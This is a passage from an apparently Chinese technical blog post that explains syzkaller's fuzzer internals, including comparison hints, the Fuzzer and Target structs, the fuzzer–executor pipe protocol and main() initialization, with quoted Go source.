class="hljs-comment">//</span><br><span class="hljs-comment">//m = &#123;</span><br><span class="hljs-comment">//op1: &#123;map[op2]: true, map[op3]: true, map[op4]: true&#125;,</span><br><span class="hljs-comment">//op2: &#123;map[op1]: true&#125;</span><br><span class="hljs-comment">//&#125;.</span><br><span class="hljs-keyword">type</span> CompMap <span class="hljs-keyword">map</span>[<span class="hljs-type">uint64</span>]<span class="hljs-keyword">map</span>[<span class="hljs-type">uint64</span>]<span class="hljs-type">bool</span><br></code></pre></td></tr></table></figure><p>看着比较抽象，<del>笔者看了半天也不知道这™是个啥玩意</del>，下面我们结合 <code>prog/hints_test.go</code> 中的示例来看：）</p><p><strong>条件分支</strong>是现代编程语言中的一个基本结构，例如我们有如下函数，其会根据不同的取值进入不同的分支：</p><figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><code class="hljs go"><span class="hljs-comment">// Models the following code:</span><br><span class="hljs-comment">// void f(u64 qw) &#123;</span><br><span class="hljs-comment">//u8 b = (u8) qw</span><br><span class="hljs-comment">//u16 w = (u16) qw</span><br><span class="hljs-comment">//u32 dw = (u32) qw</span><br><span class="hljs-comment">//if (b == 0xab) &#123;...&#125;</span><br><span class="hljs-comment">//if (w == 0xcdcd) &#123;...&#125;</span><br><span class="hljs-comment">//if (dw == 0xefefefef) &#123;...&#125;</span><br><span class="hljs-comment">//if (qw == 0x0101010101010101) &#123;...&#125;</span><br><span class="hljs-comment">//  &#125;; f(0x1234567890abcdef);</span><br></code></pre></td></tr></table></figure><p>我们给该函数传入的参数为 <code>0x1234567890abcdef</code> 在该函数当中参数由于强制类型转换而发生了<strong>截断</strong>，我们称之为<strong>收缩</strong>（shrink），由于参数截断之后一个条件都匹配不上，所以我们一个分支都进不去：(</p><p>那么如果我们想要走进不同的分支该怎么办呢？ <code>0x1234567890abcdef</code> 截断成 <code>u8</code> 后变成 <code>0xef</code>，如果我们想要走进第一个条件分支那就要替换成 <code>0xab</code>；类似地， <code>0x1234567890abcdef</code> 截断成 <code>u16</code> 后变成 <code>0xcdef</code>，如果我们想要走进第二个条件分支那就要替换成 <code>0xcdcd</code> ； <code>0x1234567890abcdef</code> 截断成 <code>u32</code> 后变成 <code>0xabcdef</code>，如果我们想要走进第三个条件分支那就要替换成 <code>0xefefef</code> ； 而如果我们想要走进最后一个条件分支，则需要将参数整个替换成 <code>0x0101010101010101</code> ，<strong>由此我们得到如下 CompMap</strong>：</p><figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs go">CompMap&#123;<br><span class="hljs-number">0xef</span>:               compSet(<span class="hljs-number">0xab</span>, <span class="hljs-number">0xef</span>),<br><span class="hljs-number">0xcdef</span>:             compSet(<span class="hljs-number">0xcdcd</span>),<br><span class="hljs-number">0x90abcdef</span>:         compSet(<span class="hljs-number">0xefefefef</span>),<br><span class="hljs-number">0x1234567890abcdef</span>: compSet(<span class="hljs-number">0x0101010101010101</span>),<br>&#125;,<br></code></pre></td></tr></table></figure><p>根据该 <code>CompMap</code> ，我们最后得到<strong>可以用来替换原参数的新参数值为</strong>：</p><figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs go">[]<span class="hljs-type">uint64</span>&#123;<br><span class="hljs-number">0x0101010101010101</span>,<br><span class="hljs-number">0x1234567890abcdab</span>,<br><span class="hljs-number">0x1234567890abcdcd</span>,<br><span class="hljs-number">0x12345678efefefef</span>,<br>&#125;,<br></code></pre></td></tr></table></figure><p>在 syzkaller 的实际运行过程当中，这些比较操作数<strong>对应的是内核中的代码分支</strong>，syzkaller 通过 <code>KCOV</code> 获取这些比较操作数，从而对程序输入变异<strong>以获取更高的代码覆盖率</strong></p><h2 id="全局管控相关"><a href="#全局管控相关" class="headerlink" title="全局管控相关"></a>全局管控相关</h2><h3 id="1-Fuzzer：基本信息"><a href="#1-Fuzzer：基本信息" class="headerlink" title="1. Fuzzer：基本信息"></a>1. Fuzzer：基本信息</h3><p><code>Fuzzer</code> 结构体用以存储一个 syz-fuzzer 的所有基本信息，定义于 <code>syz-fuzzer/fuzzer.go</code> 中：</p><figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br></pre></td><td class="code"><pre><code class="hljs go"><span class="hljs-keyword">type</span> Fuzzer <span class="hljs-keyword">struct</span> &#123;<br>name        <span class="hljs-type">string</span><br>outputType  OutputType<br>config      *ipc.Config<br>execOpts    *ipc.ExecOpts<br>procs       []*Proc<br>gate        *ipc.Gate<br>workQueue   *WorkQueue<br>needPoll    <span class="hljs-keyword">chan</span> <span class="hljs-keyword">struct</span>&#123;&#125;<br>choiceTable *prog.ChoiceTable<br>noMutate    <span class="hljs-keyword">map</span>[<span class="hljs-type">int</span>]<span class="hljs-type">bool</span><br><span class="hljs-comment">// stats 域不幸的无法仅是一个 uint64 数组, 因为其在 32 位平台上</span><br><span class="hljs-comment">// 会造成 &quot;unaligned 64-bit atomic operation&quot; 错误</span><br>stats             []<span class="hljs-type">uint64</span><br>manager           *rpctype.RPCClient<br>target            *prog.Target<br>triagedCandidates <span class="hljs-type">uint32</span><br>timeouts          targets.Timeouts<br><br>faultInjectionEnabled    <span class="hljs-type">bool</span><br>comparisonTracingEnabled <span class="hljs-type">bool</span><br>fetchRawCover            <span class="hljs-type">bool</span><br><br>corpusMu     sync.RWMutex<br>corpus       []*prog.Prog<br>corpusHashes <span class="hljs-keyword">map</span>[hash.Sig]<span class="hljs-keyword">struct</span>&#123;&#125;<br>corpusPrios  []<span class="hljs-type">int64</span><br>sumPrios     <span class="hljs-type">int64</span><br><br>signalMu     sync.RWMutex<br>corpusSignal signal.Signal <span class="hljs-comment">// 语料库中的输入的信号</span><br>maxSignal    signal.Signal <span class="hljs-comment">// 包括 flakes 在内的所观察到的最大信号</span><br>newSignal    signal.Signal <span class="hljs-comment">// 自上次与 master 同步以来的 diff of maxSignal</span><br><br>checkResult *rpctype.CheckArgs<br>logMu       sync.Mutex<br>&#125;<br><br></code></pre></td></tr></table></figure><h3 id="2-Target：目标架构信息"><a href="#2-Target：目标架构信息" class="headerlink" title="2. Target：目标架构信息"></a>2. Target：目标架构信息</h3><p>定义于 <code>prog/target.go</code> 中的 <code>Target</code> 结构体用以表示 fuzzing 目标架构的基本信息：</p><blockquote><p>懒得翻译了，太多字了，自己看：）</p></blockquote><figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br></pre></td><td class="code"><pre><code class="hljs go"><span class="hljs-comment">// Target describes target OS/arch pair.</span><br><span class="hljs-keyword">type</span> Target <span class="hljs-keyword">struct</span> &#123;<br>OS                <span class="hljs-type">string</span><br>Arch              <span class="hljs-type">string</span><br>Revision          <span class="hljs-type">string</span> <span class="hljs-comment">// unique hash representing revision of the descriptions</span><br>PtrSize           <span class="hljs-type">uint64</span><br>PageSize          <span class="hljs-type">uint64</span><br>NumPages          <span class="hljs-type">uint64</span><br>DataOffset        <span class="hljs-type">uint64</span><br>LittleEndian      <span class="hljs-type">bool</span><br>ExecutorUsesShmem <span class="hljs-type">bool</span><br><br>Syscalls  []*Syscall<br>Resources []*ResourceDesc<br>Consts    []ConstValue<br><br><span class="hljs-comment">// MakeDataMmap creates calls that mmaps target data memory range.</span><br>MakeDataMmap <span class="hljs-function"><span class="hljs-keyword">func</span><span class="hljs-params">()</span></span> []*Call<br><br><span class="hljs-comment">// Neutralize neutralizes harmful calls by transforming them into non-harmful ones</span><br><span class="hljs-comment">// (e.g. an ioctl that turns off console output is turned into ioctl that turns on output).</span><br><span class="hljs-comment">// fixStructure determines whether it&#x27;s allowed to make structural changes (e.g. add or</span><br><span class="hljs-comment">// remove arguments). It is helpful e.g. when we do neutralization while iterating over the</span><br><span class="hljs-comment">// arguments.</span><br>Neutralize <span class="hljs-function"><span class="hljs-keyword">func</span><span class="hljs-params">(c *Call, fixStructure <span class="hljs-type">bool</span>)</span></span> <span class="hljs-type">error</span><br><br><span class="hljs-comment">// AnnotateCall annotates a syscall invocation in C reproducers.</span><br><span class="hljs-comment">// The returned string will be placed inside a comment except for the</span><br><span class="hljs-comment">// empty string which will omit the comment.</span><br>AnnotateCall <span class="hljs-function"><span class="hljs-keyword">func</span><span class="hljs-params">(c ExecCall)</span></span> <span class="hljs-type">string</span><br><br><span class="hljs-comment">// SpecialTypes allows target to do custom generation/mutation for some struct&#x27;s and union&#x27;s.</span><br><span class="hljs-comment">// Map key is struct/union name for which custom generation/mutation is required.</span><br><span class="hljs-comment">// Map value is custom generation/mutation function that will be called</span><br><span class="hljs-comment">// for the corresponding type. g is helper object that allows generate random numbers,</span><br><span class="hljs-comment">// allocate memory, etc. typ is the struct/union type. old is the old value of the struct/union</span><br><span class="hljs-comment">// for mutation, or nil for generation. The function returns a new value of the struct/union,</span><br><span class="hljs-comment">// and optionally any calls that need to be inserted before the arg reference.</span><br>SpecialTypes <span class="hljs-keyword">map</span>[<span class="hljs-type">string</span>]<span class="hljs-function"><span class="hljs-keyword">func</span><span class="hljs-params">(g *Gen, typ Type, dir Dir, old Arg)</span></span> (Arg, []*Call)<br><br><span class="hljs-comment">// Resources that play auxiliary role, but widely used throughout all syscalls (e.g. pid/uid).</span><br>AuxResources <span class="hljs-keyword">map</span>[<span class="hljs-type">string</span>]<span class="hljs-type">bool</span><br><br><span class="hljs-comment">// Additional special invalid pointer values besides NULL to use.</span><br>SpecialPointers []<span class="hljs-type">uint64</span><br><br><span class="hljs-comment">// Special file name length that can provoke bugs (e.g. PATH_MAX).</span><br>SpecialFileLenghts []<span class="hljs-type">int</span><br><br><span class="hljs-comment">// Filled by prog package:</span><br>SyscallMap <span class="hljs-keyword">map</span>[<span class="hljs-type">string</span>]*Syscall<br>ConstMap   <span class="hljs-keyword">map</span>[<span class="hljs-type">string</span>]<span class="hljs-type">uint64</span><br><br>init        sync.Once<br>initArch    <span class="hljs-function"><span class="hljs-keyword">func</span><span class="hljs-params">(target *Target)</span></span><br>types       []Type<br>resourceMap <span class="hljs-keyword">map</span>[<span class="hljs-type">string</span>]*ResourceDesc<br><span class="hljs-comment">// Maps resource name to a list of calls that can create the resource.</span><br>resourceCtors <span class="hljs-keyword">map</span>[<span class="hljs-type">string</span>][]*Syscall<br>any           anyTypes<br><br><span class="hljs-comment">// The default ChoiceTable is used only by tests and utilities, so we initialize it lazily.</span><br>defaultOnce        sync.Once<br>defaultChoiceTable *ChoiceTable<br>&#125;<br></code></pre></td></tr></table></figure><h3 id="3-Proc：syz-executor-实例对象"><a href="#3-Proc：syz-executor-实例对象" class="headerlink" title="3. Proc：syz-executor 实例对象"></a>3. Proc：syz-executor 实例对象</h3><p>在 syz-fuzzer 当中 <code>Proc</code> 结构体被用以表示<strong>一个 syz-executor 实例</strong></p><figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><code class="hljs go"><span class="hljs-comment">// Proc 表示一个单独的 fuzzing 程序 (executor).</span><br><span class="hljs-keyword">type</span> Proc <span class="hljs-keyword">struct</span> &#123;<br>fuzzer          *Fuzzer<br>pid             <span class="hljs-type">int</span><br>env             *ipc.Env<br>rnd             *rand.Rand<br>execOpts        *ipc.ExecOpts<br>execOptsCollide *ipc.ExecOpts<br>execOptsCover   *ipc.ExecOpts<br>execOptsComps   *ipc.ExecOpts<br>&#125;<br></code></pre></td></tr></table></figure><p>其中 <code>env</code> 成员用以表示单个 syz-executor 的运行环境，定义于 <code>pkg/ipc/ipc.go</code> 中：</p><figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><code class="hljs go"><span class="hljs-keyword">type</span> Env <span class="hljs-keyword">struct</span> &#123;<br>in  []<span class="hljs-type">byte</span><br>out []<span class="hljs-type">byte</span><br><br>cmd       *command<br>inFile    *os.File<br>outFile   *os.File<br>bin       []<span class="hljs-type">string</span><br>linkedBin <span class="hljs-type">string</span><br>pid       <span class="hljs-type">int</span><br>config    *Config<br><br>StatExecs    <span class="hljs-type">uint64</span><br>StatRestarts <span class="hljs-type">uint64</span><br>&#125;<br></code></pre></td></tr></table></figure><p><code>Env-&gt;cmd</code> 则用以表示执行 syz-executor 的命令信息，包括 pid、配置、命令行参数等：</p><figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><code class="hljs go"><span class="hljs-keyword">type</span> command <span class="hljs-keyword">struct</span> &#123;<br>pid      <span class="hljs-type">int</span><br>config   *Config<br>timeout  time.Duration<br>cmd      *exec.Cmd<br>dir      <span class="hljs-type">string</span><br>readDone <span class="hljs-keyword">chan</span> []<span class="hljs-type">byte</span><br>exited   <span class="hljs-keyword">chan</span> <span class="hljs-type">error</span><br>inrp     *os.File<br>outwp    *os.File<br>outmem   []<span class="hljs-type">byte</span><br>&#125;<br></code></pre></td></tr></table></figure><p><code>command-&gt;cmd</code> 为最终用来执行 syz-executor 的命令行，来自于 golang 原生的 exec 库</p><h3 id="4-WorkQueue：待使用的单-syz-fuzer-的全局输入队列"><a href="#4-WorkQueue：待使用的单-syz-fuzer-的全局输入队列" class="headerlink" title="4. WorkQueue：待使用的单 syz-fuzer 的全局输入队列"></a>4. WorkQueue：待使用的单 syz-fuzer 的全局输入队列</h3><p>在 syz-fuzzer 当中所有的输入都被存放在 <code>WorkQueue</code> 队列当中，一个 syz-fuzzer 可能会启动多个 syz-executor 进程，他们共享同一个 <code>WorkQueue</code>：</p><figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><code class="hljs go"><span class="hljs-comment">// WorkQueue 存放全局的 non-fuzzing 工作项目 (参见下面的 Work* 结构体).</span><br><span class="hljs-comment">// WorkQueue 也在工作项目间进行优先排序，例如我们想要在我们碎片化程序前</span><br><span class="hljs-comment">// 分类并向 manager 发送新的输入以在 VM 崩溃的情况下不会永久失去有趣的程序.</span><br><span class="hljs-comment">//（译注：interesting input 在 fuzzing 中是经典概念了，这里应该不需要笔者注释了）</span><br><span class="hljs-keyword">type</span> WorkQueue <span class="hljs-keyword">struct</span> &#123;<br>mu              sync.RWMutex<br>triageCandidate []*WorkTriage<br>candidate       []*WorkCandidate<br>triage          []*WorkTriage<br>smash           []*WorkSmash<br><br>procs          <span class="hljs-type">int</span><br>needCandidates <span class="hljs-keyword">chan</span> <span class="hljs-keyword">struct</span>&#123;&#125;<br>&#125;<br><br></code></pre></td></tr></table></figure><p>我们可以看到 <code>WorkQueue</code> 为 <code>WorkTriage/WorkCandidate/WorkSmash</code> 都分别建立了一个新的队列 </p><h2 id="fuzzer-executor-通信相关"><a href="#fuzzer-executor-通信相关" class="headerlink" title="fuzzer &amp; executor 通信相关"></a>fuzzer &amp; executor 通信相关</h2><h3 id="1-executeReq：fuzzer→executor-请求头"><a href="#1-executeReq：fuzzer→executor-请求头" class="headerlink" title="1. executeReq：fuzzer→executor 请求头"></a>1. executeReq：fuzzer→executor 请求头</h3><p>fuzzing 的主体进程由 syz-fuzzer 完成，syz-executor 仅需要完成单个输入程序的运行，因此 syz-fuzzer 需要多次与 syz-executor 间通信：发送待运行的数据并接收运行结果</p><p>syz-fuzzer 与 syz-executor 间通信通过管道完成，因此每次通信前 syz-fuzzer 需要手动告诉 syz-executor 本次待接收的数据类型、长度等信息，这些信息被封装在固定大小的 <code>executeReq</code> 结构体当中：</p><figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><code class="hljs go"><span class="hljs-keyword">type</span> executeReq <span class="hljs-keyword">struct</span> &#123;<br>magic            <span class="hljs-type">uint64</span><br>envFlags         <span class="hljs-type">uint64</span> <span class="hljs-comment">// env flags</span><br>execFlags        <span class="hljs-type">uint64</span> <span class="hljs-comment">// exec flags</span><br>pid              <span class="hljs-type">uint64</span><br>syscallTimeoutMS <span class="hljs-type">uint64</span><br>programTimeoutMS <span class="hljs-type">uint64</span><br>slowdownScale    <span class="hljs-type">uint64</span><br>progSize         <span class="hljs-type">uint64</span><br><span class="hljs-comment">// 该结构体之后跟着一个 encodingexec 格式的序列化的测试程序.</span><br><span class="hljs-comment">// Both when sent over a pipe or in shared memory.</span><br>&#125;<br></code></pre></td></tr></table></figure><p>我们可以理解为 <code>executeReq</code> 为单次请求的请求头，后面跟着的序列化输入程序 <code>progData</code> 为单次请求的请求体，故 syz-fuzzer 向 syz-executor 发送单个程序执行请求的示例如下：</p><p><img src="https://s2.loli.net/2023/04/24/I6od1evyCE3MZWH.png" alt="image.png"></p><h3 id="2-executeReply-callReply：executor-方响应的单个系统调用执行结果"><a href="#2-executeReply-callReply：executor-方响应的单个系统调用执行结果" class="headerlink" title="2. executeReply &amp; callReply：executor 方响应的单个系统调用执行结果"></a>2. executeReply &amp; callReply：executor 方响应的单个系统调用执行结果</h3><p>有收便有发，syz-executor 在完成执行后会通过另一个管道将执行结果发送给 syz-fuzzer，由于 syzkaller 以单个系统调用为执行的最小粒度，因此syz-executor 每次返回给 syz-fuzzer 的便是<strong>单个系统调用的执行结果</strong>，使用一个头部 <code>executeReply</code> 标识信息，使用 <code>callReply</code> 存储具体结果：</p><figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><code class="hljs go"><span class="hljs-keyword">type</span> executeReply <span class="hljs-keyword">struct</span> &#123;<br>magic <span class="hljs-type">uint32</span><br><span class="hljs-comment">// If done is 0, then this is call completion message followed by callReply.</span><br><span class="hljs-comment">// If done is 1, then program execution is finished and status is set.</span><br>done   <span class="hljs-type">uint32</span><br>status <span class="hljs-type">uint32</span><br>&#125;<br><br><span class="hljs-keyword">type</span> callReply <span class="hljs-keyword">struct</span> &#123;<br>magic      <span class="hljs-type">uint32</span><br>index      <span class="hljs-type">uint32</span> <span class="hljs-comment">// call index in the program</span><br>num        <span class="hljs-type">uint32</span> <span class="hljs-comment">// syscall number (for cross-checking)</span><br>errno      <span class="hljs-type">uint32</span><br>flags      <span class="hljs-type">uint32</span> <span class="hljs-comment">// see CallFlags</span><br>signalSize <span class="hljs-type">uint32</span><br>coverSize  <span class="hljs-type">uint32</span><br>compsSize  <span class="hljs-type">uint32</span><br><span class="hljs-comment">// signal/cover/comps follow</span><br>&#125;<br></code></pre></td></tr></table></figure><p><code>executeReply</code> 中的 done 标志位用以标识传输是否结束，对于来自 syz-fuzzer 的单次执行请求，syz-executor 的返回结果如下（以一个 <code>done != 0</code> 的 <code>executeReply</code> 作为终止）：</p><p><img src="https://s2.loli.net/2023/04/24/seE43rD2uaXCbwj.png" alt="image.png"></p><h1 id="0x02-main-：与-manager-建立-RPC-连接，进行初始化工作"><a href="#0x02-main-：与-manager-建立-RPC-连接，进行初始化工作" class="headerlink" title="0x02. main()：与 manager 建立 RPC 连接，进行初始化工作"></a>0x02. main()：与 manager 建立 RPC 连接，进行初始化工作</h1><p>我们还是按照惯例从程序入口点进行分析，<code>syz-fuzzer()</code> 的 <code>main()</code> 函数做的工作比较简单，主要还是一些初始化工作以及引导后续工作流程</p><h2 id="初始化参数解析与-RPC-连接，获取语料库与输入"><a href="#初始化参数解析与-RPC-连接，获取语料库与输入" class="headerlink" title="初始化参数解析与 RPC 连接，获取语料库与输入"></a>初始化参数解析与 RPC 连接，获取语料库与输入</h2><h3 id="Step-I-一些初始化工作"><a href="#Step-I-一些初始化工作" class="headerlink" title="Step.I - 一些初始化工作"></a>Step.I - 一些初始化工作</h3><p>一开始还是惯例的各种初始化和配置参数解析工作</p><figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br></pre></td><td class="code"><pre><code class="hljs go"><span class="hljs-comment">// nolint: funlen</span><br><span class="hljs-function"><span class="hljs-keyword">func</span> <span class="hljs-title">main</span><span class="hljs-params">()</span></span> &#123;<br>debug.SetGCPercent(<span class="hljs-number">50</span>)<br><br><span class="hljs-keyword">var</span> (<br>flagName     = flag.String(<span class="hljs-string">&quot;name&quot;</span>, <span class="hljs-string">&quot;test&quot;</span>, <span class="hljs-string">&quot;unique name for manager&quot;</span>)<br>flagOS       = flag.String(<span class="hljs-string">&quot;os&quot;</span>, runtime.GOOS, <span class="hljs-string">&quot;target OS&quot;</span>)<br>flagArch     = flag.String(<span class="hljs-string">&quot;arch&quot;</span>, runtime.GOARCH, <span class="hljs-string">&quot;target arch&quot;</span>)<br>flagManager  = flag.String(<span class="hljs-string">&quot;manager&quot;</span>, <span class="hljs-string">&quot;&quot;</span>, <span class="hljs-string">&quot;manager rpc address&quot;</span>)<br>flagProcs    = flag.Int(<span class="hljs-string">&quot;procs&quot;</span>, <span class="hljs-number">1</span>, <span class="hljs-string">&quot;number of parallel test processes&quot;</span>)<br>flagOutput   = flag.String(<span class="hljs-string">&quot;output&quot;</span>, <span class="hljs-string">&quot;stdout&quot;</span>, <span class="hljs-string">&quot;write programs to none/stdout/dmesg/file&quot;</span>)<br>flagTest     = flag.Bool(<span class="hljs-string">&quot;test&quot;</span>, <span class="hljs-literal">false</span>, <span class="hljs-string">&quot;enable image testing mode&quot;</span>)      <span class="hljs-comment">// used by syz-ci</span><br>flagRunTest  = flag.Bool(<span class="hljs-string">&quot;runtest&quot;</span>, <span class="hljs-literal">false</span>, <span class="hljs-string">&quot;enable program testing mode&quot;</span>) <span class="hljs-comment">// used by pkg/runtest</span><br>flagRawCover = flag.Bool(<span class="hljs-string">&quot;raw_cover&quot;</span>, <span class="hljs-literal">false</span>, <span class="hljs-string">&quot;fetch raw coverage&quot;</span>)<br>)<br><span class="hljs-keyword">defer</span> tool.Init()()<br>outputType := parseOutputType(*flagOutput)<br>log.Logf(<span class="hljs-number">0</span>, <span class="hljs-string">&quot;fuzzer started&quot;</span>)<br><br>target, err := prog.GetTarget(*flagOS, *flagArch)<br><span class="hljs-keyword">if</span> err != <span class="hljs-literal">nil</span> &#123;<br>log.Fatalf(<span class="hljs-string">&quot;%v&quot;</span>, err)<br>&#125;<br><br>config, execOpts, err := ipcconfig.Default(target)<br><span class="hljs-keyword">if</span> err != <span class="hljs-literal">nil</span> &#123;<br>log.Fatalf(<span class="hljs-string">&quot;failed to create default ipc config: %v&quot;</span>, err)<br>&#125;<br><span class="hljs-keyword">if</span> *flagRawCover &#123;<br>execOpts.Flags &amp;^= ipc.FlagDedupCover<br>&#125;<br>timeouts := config.Timeouts<br>sandbox := ipc.FlagsToSandbox(config.Flags)<br></code></pre></td></tr></table></figure><p>接下来会创建一个 <code>shutdown</code> channel 并启动一个协程进行监测，当该 channel 有数据时说明遇到了一些情况，此时 syz-fuzzer 需要主动退出</p><figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><code class="hljs go">shutdown := <span class="hljs-built_in">make</span>(<span class="hljs-keyword">chan</span> <span class="hljs-keyword">struct</span>&#123;&#125;)<br>osutil.HandleInterrupts(shutdown)<br><span class="hljs-keyword">go</span> <span class="hljs-function"><span class="hljs-keyword">func</span><span class="hljs-params">()</span></span> &#123;<br><span class="hljs-comment">// Handles graceful preemption on GCE.</span><br>&lt;-shutdown<br>log.Logf(<span class="hljs-number">0</span>, <span class="hljs-string">&quot;SYZ-FUZZER: PREEMPTED&quot;</span>)<br>os.Exit(<span class="hljs-number">1</span>)<br>&#125;()<br></code></pre></td></tr></table></figure><p><code>osutil.HandleInterrupts()</code> 则是一个根据不同的目标 os 进行定制的函数，对于 unix 系 os 而言该函数定义于 <code>osutil_unix.go</code> 中，其会等待收到三个 SIGINT 信号才真正关闭程序：</p><figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><code class="hljs go"><span class="hljs-comment">// HandleInterrupts 在第一个 SIGINT 时关闭 shutdown chan</span><br><span class="hljs-comment">// (希望程序能优雅地 shutdown 并 exit)</span><br><span class="hljs-comment">// 并在第三个 SIGINT 时终止程序.</span><br><span class="hljs-function"><span class="hljs-keyword">func</span> <span class="hljs-title">HandleInterrupts</span><span class="hljs-params">(shutdown <span class="hljs-keyword">chan</span> <span class="hljs-keyword">struct</span>&#123;&#125;)</span></span> &#123;<br><span class="hljs-keyword">go</span> <span class="hljs-function"><span class="hljs-keyword">func</span><span class="hljs-params">()</span></span> 